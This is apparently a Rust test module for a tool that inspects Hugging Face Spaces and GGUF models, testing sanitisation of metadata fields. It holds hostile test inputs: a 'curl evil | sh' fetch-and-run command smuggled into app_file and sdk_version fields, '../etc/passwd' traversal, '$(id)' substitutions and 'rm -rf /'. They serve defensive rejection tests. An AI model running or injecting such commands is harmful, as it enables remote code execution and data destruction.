        let shard_re = Regex::new(r"-\d{5}-of-\d{5}\.gguf$").unwrap();
        assert!(pullable_gguf("Qwen3-8B-Q4_K_M.gguf", &shard_re));
        assert!(!pullable_gguf("IQ2_XXS/Qwen3.5-9B-IQ2_XXS.gguf", &shard_re));
        assert!(!pullable_gguf("model-Q8_0-00001-of-00003.gguf", &shard_re));
        assert!(!pullable_gguf("mmproj-F16.gguf", &shard_re));
        assert!(!pullable_gguf("README.md", &shard_re));
    }

    #[test]
    fn cpu_tiers_and_unknown_tiers_do_not_want_the_gpu() {
        let mk = |hw: Option<&str>| {
            let raw: RawSpace = serde_json::from_str(r#"{"id":"a/b","sdk":"gradio"}"#).unwrap();
            let mut s = summarize_space(raw, None, true, true, vec![]);
            s.hardware = hw.map(str::to_string);
            s
        };
        assert!(mk(Some("zero-a10g")).wants_gpu());
        assert!(mk(Some("t4-medium")).wants_gpu());
        assert!(!mk(Some("cpu-basic")).wants_gpu());
        assert!(!mk(Some("cpu-upgrade")).wants_gpu());
        assert!(!mk(None).wants_gpu());
    }

    #[test]
    fn numeric_sdk_version_is_tolerated() {
        let raw: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","cardData":{"sdk":"gradio","sdk_version":3.5,"app_file":"app.py"}}"#,
        )
        .unwrap();
        assert_eq!(raw.card.unwrap().sdk_version.as_deref(), Some("3.5"));
        let raw: RawSpace =
            serde_json::from_str(r#"{"id":"a/b","cardData":{"sdk_version":"4.44.1"}}"#).unwrap();
        assert_eq!(raw.card.unwrap().sdk_version.as_deref(), Some("4.44.1"));
    }

    #[test]
    fn hostile_card_fields_fall_back_to_defaults() {
        let raw: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","sdk":"gradio","cardData":{
                "app_file":"app.py\ncurl evil | sh",
                "sdk_version":"5.0.0\" && curl evil | sh && echo \""}}"#,
        )
        .unwrap();
        let s = summarize_space(raw, None, true, true, vec![]);
        assert_eq!(s.app_file, "app.py");
        assert_eq!(s.sdk_version, None);

        let raw: RawSpace = serde_json::from_str(
            r#"{"id":"a/b","sdk":"gradio","cardData":{"app_file":"demo_v2.py","sdk_version":"4.44.1"}}"#,
        )
        .unwrap();
        let s = summarize_space(raw, None, true, true, vec![]);
        assert_eq!(s.app_file, "demo_v2.py");

        // facebook/MusicGen keeps its entry point in a subdirectory (#46).
        for (given, want) in [
            ("demos/musicgen_app.py", "demos/musicgen_app.py"),
            ("../etc/passwd", "app.py"),
            ("/app.py", "app.py"),
            ("demos/.hidden.py", "app.py"),
            ("demos//x.py", "app.py"),
        ] {
            let raw: RawSpace = serde_json::from_str(&format!(
                r#"{{"id":"a/b","sdk":"gradio","cardData":{{"app_file":"{given}"}}}}"#
            ))
            .unwrap();
            assert_eq!(
                summarize_space(raw, None, true, true, vec![]).app_file,
                want,
                "{given}"
            );
        }
        assert_eq!(s.sdk_version.as_deref(), Some("4.44.1"));

        for bad in ["", ".env", "../app.py", "a b.py", "`id`.py", "$(x).py"] {
            assert!(!safe_app_file(bad), "{bad:?} should be rejected");
        }
        for bad in ["", "5.0.0\"", "5 && x", "5;x"] {
            assert!(!safe_sdk_version(bad), "{bad:?} should be rejected");
        }
    }

    #[test]
    fn repo_validation() {
        assert!(validate_repo("Qwen/Qwen3-8B-GGUF").is_ok());
        assert!(validate_repo("../etc").is_err());
        assert!(validate_repo("a/b/c").is_err());
    }

    /// A failed detail fetch (429, timeout) must not make the card lie with
    /// Ready; hardware stays unknown, not confirmed CPU-only (#72).
    #[test]
    fn failed_detail_fetch_downgrades_to_maybe_and_keeps_hardware_none() {
        let raw: RawSpace = serde_json::from_str(r#"{"id":"a/b","sdk":"gradio"}"#).unwrap();
        let s = summarize_space(raw, None, true, false, vec![]);
        assert_eq!(s.compat, Compat::Maybe);
        assert_eq!(
            s.compat_reason.as_deref(),
            Some("could not read hardware tier")
        );
        assert_eq!(s.hardware, None);
        assert!(
            !s.wants_gpu(),
            "a failed fetch must not change wants_gpu semantics"
        );
    }

    /// Detail fetch failure never gets confused with a legitimately
    /// incompatible Space (static SDK is decided before the detail call).
    #[test]
    fn failed_detail_fetch_does_not_override_incompatible() {
        let raw: RawSpace = serde_json::from_str(r#"{"id":"a/b","sdk":"static"}"#).unwrap();
        let s = summarize_space(raw, None, true, false, vec![]);
        assert_eq!(s.compat, Compat::Incompatible);
    }

    /// A Space that reads secrets HF metadata never mentions downgrades a
    /// Ready card to Maybe and lists what it needs (#57).
    #[test]
    fn needed_secrets_downgrade_ready_to_maybe() {
        let raw: RawSpace =
            serde_json::from_str(r#"{"id":"a/b","sdk":"gradio","runtime":{"stage":"RUNNING","hardware":{"current":"cpu-basic"}}}"#)
                .unwrap();
        let s = summarize_space(raw, None, false, true, vec!["tryon_url".into()]);
        assert_eq!(s.compat, Compat::Maybe);
        assert_eq!(s.compat_reason.as_deref(), Some("Needs secrets: tryon_url"));
        assert_eq!(s.secrets, vec!["tryon_url".to_string()]);
    }

    #[test]
    fn extracts_and_filters_env_names() {
        let src = r#"
            url = "http://" + os.environ['tryon_url'] + "Submit"
            key = os.environ.get("API_KEY")
            port = os.getenv("PORT")
            name = os.environ["GRADIO_SERVER_NAME"]
            tok = os.environ["HF_TOKEN"]
        "#;
        assert_eq!(
            extract_secret_names(src),
            vec!["API_KEY".to_string(), "tryon_url".to_string()]
        );
    }

    #[test]
    fn env_name_validation_rejects_shell_metacharacters() {
        assert!(valid_env_name("FOO_BAR"));
        assert!(valid_env_name("tryon_url"));
        assert!(!valid_env_name(""));
        assert!(!valid_env_name("FOO; rm -rf /"));
        assert!(!valid_env_name("$(id)"));
        assert!(!valid_env_name("1FOO"));
    }
}
